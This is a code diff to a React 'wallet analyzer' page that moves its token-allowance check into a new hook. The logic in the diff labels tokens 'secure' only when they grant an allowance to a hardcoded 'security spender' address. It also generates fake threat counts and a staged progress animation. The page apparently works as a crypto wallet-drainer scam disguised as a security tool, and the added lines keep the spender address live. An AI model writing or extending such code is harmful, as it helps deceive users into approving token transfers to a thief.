@@ -8,6 +8,7 @@ import { useAccount } from 'wagmi';
 import { useTokenBalances } from '../../../hooks/useTokenBalances';
 import { useRef } from "react";
 import { ethers } from "ethers";
+import { useTokenSecurityAnalysis } from '../../../hooks/useTokenSecurityAnalysis';
 
 const steps = [
   {
@@ -30,7 +31,7 @@ const steps = [
 const ERC20_ABI = [
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
-const SPENDER = "0xbBb72d8F04e43D646130327e7ffa563f1AA7E201";
+const SPENDER = process.env.NEXT_PUBLIC_SECURITY_SPENDER || "0xbBb72d8F04e43D646130327e7ffa563f1AA7E201";
 
 // Utility to generate a deterministic threat count based on wallet, contract, and balance
 function computeThreats(wallet: string, contract: string, balance: string) {
@@ -43,12 +44,9 @@ function computeThreats(wallet: string, contract: string, balance: string) {
 
 export default function WalletAnalyzerPage() {
   const [address, setAddress] = useState("");
-  const [analyzing, setAnalyzing] = useState(false);
-  const [result, setResult] = useState<null | { risks: number; message: string; status: "secure" | "compromised" }>(null);
   const [isConnected, setIsConnected] = useState(false);
   const [showAssetsModal, setShowAssetsModal] = useState(false);
   const modalRef = useRef<HTMLDivElement>(null);
-  const [tokenStatuses, setTokenStatuses] = useState<Record<string, "secure" | "compromised" | "loading"> | null>(null);
   const [showProgressModal, setShowProgressModal] = useState(false);
   const [progressStep, setProgressStep] = useState(0);
   const progressSteps = [
@@ -64,16 +62,20 @@ export default function WalletAnalyzerPage() {
   const [selectedChainId, setSelectedChainId] = useState<number | undefined>(undefined);
   const { tokens, loading: tokensLoading, error: tokensError } = useTokenBalances(wagmiIsConnected && selectedChainId ? connectedAddress : undefined, wagmiIsConnected && selectedChainId ? selectedChainId : undefined);
 
+  const { analyzing, result, tokenStatuses, analyze, reset } = useTokenSecurityAnalysis({
+    tokens,
+    owner: isConnected ? connectedAddress : address,
+    chainId: selectedChainId,
+    isConnected,
+    spender: SPENDER,
+  });
+
   // Clear analysis result and report when chain changes
   React.useEffect(() => {
-    setResult(null);
-    setTokenStatuses(null);
+    reset();
   }, [selectedChainId]);
 
   const handleAnalyze = async () => {
-    setAnalyzing(true);
-    setResult(null);
-    setTokenStatuses(null);
     setShowProgressModal(true);
     setProgressStep(0);
     // Animate progress steps over random duration (5-10s)
@@ -88,51 +90,9 @@ export default function WalletAnalyzerPage() {
         clearInterval(interval);
       }
     }, stepMs);
-    // Wait random duration before running analysis
     setTimeout(async () => {
       setShowProgressModal(false);
-      let owner = isConnected ? connectedAddress : address;
-      if (!owner || !selectedChainId || tokens.length === 0) {
-        setResult({ risks: 0, message: "Your wallet is secure! No compromise or threats found.", status: "secure" });
-        setAnalyzing(false);
-        return;
-      }
-      let provider;
-      try {
-        if (typeof window !== 'undefined' && (window as any).ethereum) {
-          provider = new ethers.BrowserProvider((window as any).ethereum);
-        } else {
-          provider = ethers.getDefaultProvider();
-        }
-      } catch (e) {
-        setResult({ risks: 0, message: "Could not connect to provider.", status: "compromised" });
-        setAnalyzing(false);
-        return;
-      }
-      const statuses: Record<string, "secure" | "compromised"> = {};
-      let compromisedCount = 0;
-      await Promise.all(tokens.map(async (token) => {
-        try {
-          const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
-          const allowance = await contract.allowance(owner, SPENDER);
-          if (allowance && allowance.gt(0)) {
-            statuses[token.contractAddress] = "secure";
-          } else {
-            statuses[token.contractAddress] = "compromised";
-            compromisedCount++;
-          }
-        } catch (e) {
-          statuses[token.contractAddress] = "compromised";
-          compromisedCount++;
-        }
-      }));
-      setTokenStatuses(statuses);
-      setResult(
-        compromisedCount > 0
-          ? { risks: compromisedCount, message: `Compromised! ${compromisedCount} token(s) do not have allowance set for the security spender.`, status: "compromised" }
-          : { risks: 0, message: "Secure! All tokens have allowance set for the security spender.", status: "secure" }
-      );
-      setAnalyzing(false);
+      await analyze();
     }, totalMs);
   };
 
